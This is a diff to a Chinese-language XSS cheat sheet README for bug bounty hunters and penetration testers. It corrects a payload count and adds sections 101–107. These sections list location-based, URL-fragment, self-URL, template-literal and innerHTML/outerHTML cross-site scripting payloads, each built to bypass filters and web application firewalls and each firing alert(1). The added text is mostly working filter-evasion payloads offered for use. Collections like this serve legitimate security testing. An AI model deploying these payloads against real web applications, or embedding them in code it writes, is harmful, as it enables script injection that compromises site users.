@@ -2,7 +2,7 @@
 
 ## 简介
 白帽赏金平台xss漏洞模糊测试有效载荷的最佳集合 2020版 <br>
-该备忘清单可用于漏洞猎人，安全分析，渗透测试人员，根据应用的实际情况测试不同的payload，并观察响应内容，查找web应用的跨站点脚本漏洞，共计xxx条xss漏洞测试小技巧 <br>
+该备忘清单可用于漏洞猎人，安全分析，渗透测试人员，根据应用的实际情况测试不同的payload，并观察响应内容，查找web应用的跨站点脚本漏洞，共计100+条xss漏洞测试小技巧 <br>
 本备忘录翻译自国外的`XSS_Cheat_Sheet_2020_Edition.pdf`议题，源文件可在本项目内直接下载 <br>
 整理完毕的测试payload清单文件为:`xss_payload_list.txt` <br>
 整理不易，少侠，留个小星星再走吧 (ฅ>ω<*ฅ)～
@@ -784,6 +784,72 @@ function CrossPwn() {frames[0].postMessage(msg,'*')}
 </script>
 </body>
 </html>
+```
+**101.Location Based Payloads (基于位置的有效载荷)** <br>
+下面的XSS payload使用一种更详细的方法来执行负载，使用文档属性来提供另一个文档属性，即位置属性。这就产生了复杂的向量，对于绕过滤器和waf非常有用。因为它们使用任意标记（XHTML），所以可以使用前面看到的任何未知的事件处理程序。这里，"onmouseover"将用作默认值。在URL中将加号（＋）编码为%2B。<br>
+
+**102.Location Basics (位置基础知识)** <br>
+payload与更简单的操作，以实现重定向到javascript伪协议。 <br>
+```
+<j/onmouseover=location=innerHTML>javascript:alert(1)//
+<iframe id=t:alert(1) name=javascrip onload=location=name+id>
+```
+**103.Location with URL Fragment (包含URL片段的位置)** <br>
+如果在POST请求中需要使用带有未编码符号的payload。，URL必须在操作URL中使用片段。<br>
+```
+<javascript/onmouseover=location=tagName+innerHTML+location.hash>:/*hoverme!
+</javascript>#*/alert(1)
+<javascript/onmouseover=location=tagName+innerHTML+location.hash>:'hoverme!
+</javascript>#'-alert(1)
+<javascript:'-`/onmouseover=location=tagName+URL>hoverme!#`-alert(1)
+<j/onmouseover=location=innerHTML+URL>javascript:'-`hoverme!</j>#`-alert(1)
+<javas/onmouseover=location=tagName+innerHTML+URL>cript:'-`hoverme!</javas>
+#`-alert(1)
+<javascript:/onmouseover=location=tagName+URL>hoverme!#%0Aalert(1)
+<j/onmouseover=location=innerHTML+URL>javascript:</j>#%0Aalert(1)
+<javas/onmouseover=location=tagName+innerHTML+URL>cript:</javas>#%0Aalert(1)
+```
+**104.Location with Leading Alert (最重要的弹窗位置)** <br>
+```
+`-alert(1)<javascript:`/
+onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
+`-alert(1)<javas/
+onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
+<alert(1)<!--/onmouseover=location=innerHTML+outerHTML>javascript:1/*hoverme!*/
+</alert(1)<!-->
+<j/1="*/""-alert(1)<!--/onmouseover=location=innerHTML+outerHTML>
+javascript:/*hoverme!
+*/"<j/1=/alert(1)//onmouseover=location=innerHTML+
+previousSibling.nodeValue+outerHTML>javascript:/*hoverme!
+```
+**105.Location with Self URL (last is FF Only) (具有self URL的位置（最后一个仅限FF）)** <br>
+以下payload需要用使用输入的易受攻击的参数替换`[P}`。在URL中将`&`编码为`%26`。<br>
+```
+<svg id=?[P]=<svg/onload=alert(1)+ onload=location=id>
+<j/onmouseover=location=textContent>?[P]=&lt;svg/onload=alert(1)>hoverme!</j>
+<j/onmouseover=location+=textContent>&[P]=&lt;svg/onload=alert(1)>hoverme!</j>
+<j&[P]=<svg+onload=alert(1)/onmouseover=location+=outerHTML>hoverme!
+</j&[P]=<svg+onload=alert(1)>
+&[P]=&lt;svg/onload=alert(1)><j/
+onmouseover=location+=document.body.textContent>hoverme!</j>
+```
+**106.Location with Template Literal (具有模板文本的位置)** <br>
+```
+${alert(1)}<javascript:`//onmouseover=location=tagName+URL>hoverme!
+${alert(1)}<j/onmouseover=location=innerHTML+URL>javascript:`//hoverme!
+${alert(1)}<javas/onmouseover=location=tagName+innerHTML+URL>cript:`//hoverme!
+${alert(1)}`<javascript:`//
+onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
+${alert(1)}`<javas/
+onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
+```
+
+**107.Inner & Outer HTML Properties Alternative (内部和外部HTML属性选项)** <br>
+最后这些payload利用元素的innerHTML和outerHTML属性得到与位置向量相同的结果。但是他们需要创建一个完整的HTML向量，而不是一个`javascript:aler(1)`字符串。下面的元素集合可以与索引0一起使用，以便更容易地遵循：`all[0]`、`anchors[0],`、`embed[0]`、`forms[0]`、`images[0]`、`links[0]`和`scripts[0]`。它们都可以替换下面使用的head或body元素。<br>
+
+```
+<svg id=<img/src/onerror&#61alert(1)&gt; onload=head.innerHTML=id>
+<svg id=<img/src/onerror&#61alert(1)&gt; onload=body.outerHTML=id>
 ```
 
 ## 致谢
